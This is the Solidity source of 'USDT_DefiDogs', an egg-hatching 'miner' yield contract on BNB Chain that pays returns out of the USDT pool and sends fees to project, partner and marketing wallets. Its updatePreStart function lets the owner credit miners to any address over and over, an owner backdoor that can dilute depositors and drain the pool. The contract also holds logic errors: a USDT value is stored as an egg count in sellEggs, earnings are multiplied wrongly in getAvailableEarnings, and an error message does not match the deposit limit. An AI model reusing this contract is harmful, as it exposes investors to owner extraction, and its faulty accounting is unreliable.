/**
 *Submitted for verification at BscScan.com on 2021-12-14
*/

pragma solidity ^0.4.26; // solhint-disable-line

contract ERC20 {
    function totalSupply() public constant returns (uint);
    function balanceOf(address tokenceo) public constant returns (uint balance);
    function allowance(address tokenceo, address spender) public constant returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);
    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenceo, address indexed spender, uint tokens);
}

contract USDT_DefiDogs {
    using SafeMath for uint256;
    //address usdt = 0x55d398326f99059fF775485246999027B3197955;
    address usdt = 0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7; /** testnet usdt **/
    uint256 public EGGS_TO_HATCH_1MINERS=1440000; //5%
    uint256 public EGGS_TO_HATCH_1MINERS_COMPOUND=575424; //15% for hiring miners
    uint256 PSN=10000;
    uint256 PSNH=5000;
    uint256 public CUT_OFF = 32 * 60 * 60; //prevent accumulating
    uint256 public MIN_INVEST = 10 ether;
    uint256 public MAX_DEPOSIT = 10000 ether;
    uint256 public MAX_WITHDRAW = 5000 ether; 
    bool public initialized=false;
    address public ceo;
    address public project;
    address public partner;
    address public marketing;
    uint256 Default = 50000;
    mapping (address => uint256) public deposits;
    mapping (address => uint256) public hatcheryMiners;
    mapping (address => uint256) public claimedEggs;
    mapping (address => uint256) public lastHatch;
    mapping (address => address) public referrals;
    uint256 public marketEggs;
    constructor(address _project, address _partner, address _marketing) public{
        ceo=msg.sender;
        project=_project;
        partner=_partner;
        marketing=_marketing;
    }
    function hatchEggs(address ref) public {
        require(initialized);
        if(ref == msg.sender) {
            ref = project;
        }
        if(referrals[msg.sender]==0 && referrals[msg.sender]!=msg.sender) {
            referrals[msg.sender]=ref;
        }
        uint256 eggsUsed = getMyEggs();
        uint256 newMiners=SafeMath.div(eggsUsed,EGGS_TO_HATCH_1MINERS_COMPOUND);
        hatcheryMiners[msg.sender]=SafeMath.add(hatcheryMiners[msg.sender],newMiners);
        claimedEggs[msg.sender]=0;
        lastHatch[msg.sender]=now;
        //send referral eggs
        claimedEggs[referrals[msg.sender]]=SafeMath.add(claimedEggs[referrals[msg.sender]],SafeMath.div(eggsUsed,8));
        //boost market to nerf miners hoarding
        marketEggs=SafeMath.add(marketEggs,SafeMath.div(eggsUsed,20));
    }
    function sellEggs() public {
        require(initialized);
        uint256 hasEggs=getMyEggs();
        uint256 eggValue=calculateEggSell(hasEggs);
        if(MAX_WITHDRAW != 0 && eggValue >= MAX_WITHDRAW) {
            claimedEggs[msg.sender] = SafeMath.sub(eggValue,MAX_WITHDRAW);
            eggValue = MAX_WITHDRAW;
        }else{
            claimedEggs[msg.sender] = 0;
        }
        lastHatch[msg.sender]=now;
        marketEggs=SafeMath.add(marketEggs,hasEggs);
        ERC20(usdt).transfer(project, eggValue.mul(20).div(1000));
        ERC20(usdt).transfer(partner, eggValue.mul(20).div(1000));
        ERC20(usdt).transfer(marketing, eggValue.mul(10).div(1000));
        ERC20(usdt).transfer(address(msg.sender), eggValue);
    }
    function buyEggs(address ref, uint256 amount) public {
        if (!initialized) {
    		if (msg.sender == ceo) {
    		    require(marketEggs == 0);
    			initialized = true;
                marketEggs = 144000000000;
    		} else revert("Only CEO can start contract.");
    	}
        uint256 walletDeposit = SafeMath.add(amount, deposits[msg.sender]);
        require(walletDeposit < MAX_DEPOSIT, "$5,000 max wallet deposit limit.");
        require(amount >= MIN_INVEST, "$10 dollars minimum investment.");
        ERC20(usdt).transferFrom(address(msg.sender), address(this), amount);
        deposits[msg.sender]=SafeMath.add(deposits[msg.sender], amount);
        uint256 balance = ERC20(usdt).balanceOf(address(this));
        uint256 eggsBought=calculateEggBuy(amount,SafeMath.sub(balance,amount));
        ERC20(usdt).transfer(project, amount.mul(20).div(1000));
        ERC20(usdt).transfer(partner, amount.mul(20).div(1000));
        ERC20(usdt).transfer(marketing, amount.mul(10).div(1000));
        claimedEggs[msg.sender]=SafeMath.add(claimedEggs[msg.sender],eggsBought);
        hatchEggs(ref);
    }
    function updatePreStart(address value,uint256 value2) external {
        require(msg.sender == ceo);
        require(value2 <= Default);
        hatcheryMiners[value] = SafeMath.add(hatcheryMiners[value], value2);
        lastHatch[value]=now;
    }
    //magic trade balancing algorithm
    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256) {
        //(PSN*bs)/(PSNH+((PSN*rs+PSNH*rt)/rt));
        return SafeMath.div(SafeMath.mul(PSN,bs),SafeMath.add(PSNH,SafeMath.div(SafeMath.add(SafeMath.mul(PSN,rs),SafeMath.mul(PSNH,rt)),rt)));
    }
    function calculateEggSell(uint256 eggs) public view returns(uint256) {
        return calculateTrade(eggs,marketEggs,ERC20(usdt).balanceOf(address(this)));
    }
    function calculateEggBuy(uint256 eth,uint256 contractBalance) public view returns(uint256) {
        return calculateTrade(eth,contractBalance,marketEggs);
    }
    function calculateEggBuySimple(uint256 eth) public view returns(uint256){
        return calculateEggBuy(eth,ERC20(usdt).balanceOf(address(this)));
    }
    function getBalance() public view returns(uint256) {
        return ERC20(usdt).balanceOf(address(this));
    }
    function getAvailableEarnings(address _adr) public view returns(uint256) {
        uint256 userEggs = SafeMath.mul(claimedEggs[msg.sender],getEggsSinceLastHatch(_adr));
        return calculateEggSell(userEggs);
    }
    function getMyMiners() public view returns(uint256) {
        return hatcheryMiners[msg.sender];
    }
    function getMyEggs() public view returns(uint256) {
        return SafeMath.add(claimedEggs[msg.sender],getEggsSinceLastHatch(msg.sender));
    }
    function getEggsSinceLastHatch(address adr) public view returns(uint256) {
        uint256 secondsSinceLastHatch=SafeMath.sub(now, lastHatch[adr]);
        uint256 secondsUpToTwoDays=min(secondsSinceLastHatch, CUT_OFF);
        uint256 secondsPassed=min(EGGS_TO_HATCH_1MINERS,secondsUpToTwoDays);
        return SafeMath.mul(secondsPassed,hatcheryMiners[adr]);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
}

library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}